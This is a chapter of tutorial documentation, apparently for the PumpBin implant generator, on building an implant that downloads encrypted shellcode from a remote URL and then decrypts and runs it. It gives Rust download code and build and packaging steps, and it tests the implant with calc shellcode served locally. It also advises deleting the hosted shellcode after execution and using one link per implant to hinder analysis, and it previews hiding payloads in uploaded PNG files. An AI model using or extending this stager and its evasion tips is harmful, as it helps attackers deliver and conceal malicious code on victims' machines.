# Remote Type

In this chapter, we will create a plugin of type `Remote`.

The shellcode of a plugin of type `Remote` is hosted on a remote server. By controlling the accessibility of the shellcode, it can be made more difficult to extract and analyze, thereby protecting the infrastructure.

For example, delete the remote shellcode file after the implant has run successfully. (provided you don't have other implants that depend on this link running)

It is recommended to always set a unique shellcode hosting address for each generated final implant (one final implant corresponds to one link)

## Create binary implant template

We will modify the [previous chapter code](https://github.com/pumpbin/pumpbin/tree/main/examples/create_thread_encrypt)

First, we need a way to get the encrypted shellcode file from the remote server, instead of including the shellcode placeholder data in the binary implant template in advance.

Delete build.rs (no longer needed to generate shellcode placeholder data).

Add dependencies to the end of Cargo.toml. In this example, the http protocol is used for demonstration purposes. (Any protocol can be used, or the download function can be implemented in any way)

```toml
reqwest = { version = "0.12.5", features = ["blocking"] }
```

Add the following download function to the main function of main.rs

```rust
fn download() -> Vec<u8> {
    const URL: &[u8; 81] =
        b"$$UURRLL$$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    let url = CStr::from_bytes_until_nul(URL).unwrap();
    reqwest::blocking::get(url.to_str().unwrap())
        .unwrap()
        .bytes()
        .unwrap()
        .to_vec()
}
```

$$UURRLL$$ is a `Prefix`, which means that the URL constant will be filled with valid data + random data, so it is recommended to reserve a certain number of bytes for PumpBin to fill with random bytes.

Since URLs and the like are mostly printable characters, the processing here is slightly different from the $$$SHELLCODE$$ `Prefix` in Chapter 1.

We no longer need a size holder to distinguish between valid data and invalid data. Instead, PumpBin will add a \\x00 byte after the valid data to locate the valid data.
(So the actual maximum URL length will be one byte less than Max Len because a \\x00 byte will be added at the end.)

This is easy to implement in Rust, and other languages should have similar implementations. If not, just use a for loop to check if it is a \\x00 byte byte by byte.

After implementing the download function, we need to use it in main.rs to replace the shellcode placeholder data

Delete the first four lines of the main function in main.rs and add the following code to the first line

```rust
let shellcode = download();
let shellcode = shellcode.as_slice();
```

The modified main function is as follows

```rust
fn main() {
    let shellcode = download();
    let shellcode = shellcode.as_slice();
    let shellcode = decrypt(shellcode);
    let shellcode_size = shellcode.len();
    ...
```

Compiling the modified `create_thread` project, we will get a binary implant template that uses the http protocol to download the encrypted shellcode file.

```sh
cargo b -r
```

## Create Plugin

Use PumpBin Maker to create a plugin, similar to the previous section.

Prefix: Enter `$$UURRLL$$`

Max Len: Enter the length of the URL constant array reference. 81.

Type: Select `Remote`

> Download the compiled [aes256_gcm.wasm](https://github.com/pumpbin/plug-in/releases) and enter the file path into the `Encrypt Shellcode Plug-in` input box in PumpBin Maker.
> (You can also use the file selection dialog to select the downloaded `aes256_gcm.wasm` file)

> Plugin Name: Enter first_plugin. (This field is the unique identifier for the plugin, which means that users cannot install two plugins with the same name at the same time.)

> Windows Exe: Select the binary implant template we compiled above. (You can also directly enter the file path)

> Click Generate, save the generated b1n file

## Test Plugin

Use the PumpBin plugin to install the plugin, click the Encrypt button to select `w64-exec-calc-shellcode-func` to generate an encrypted shellcode file.

Use Python 3 to start an HTTP service in the same directory as the encrypted shellcode file.

```sh
python -m http.server 8000
```

The local http address of the encrypted shellcode file should be `http://127.0.0.1:8000/shellcode.enc`

Fill in PumpBin, generate the final implant, run it and you should see the access request, the calc program is started.

<div class="warning">

If you use the Encrypt Shellcode Plug-in with a random encryption password

the random encryption password recorded internally will be updated every time you click the Encrypt button to successfully encrypt the shellcode (because the real encryption password needs to be patched into the binary implant template).
If you encrypt the shellcode once (call it shellcode0), upload shellcode0 to the remote server and fill in the link into PumpBin,
but before generating the final implant, you encrypt the shellcode again (call it shellcode1), and then generate the final implant, then the final implant generated can only decrypt shellcode1, but not the remote shellcode0 file.

</div>

The following chapters will introduce how to develop the PumpBin Extism Plug-in and more internal details to help cyber security researchers deal with complex requirements.

For example, how to write the encrypted shellcode to a png file after the user clicks the Encrypt button to encrypt the shellcode, and then upload the png file to a website.
After the upload is successful, the remote png file access address is automatically filled in the shellcode url input box.

The complete project file in this example is in the PumpBin code repository [examples/create_thread_remote](https://github.com/pumpbin/pumpbin/blob/main/examples/create_thread_remote/src/main.rs).
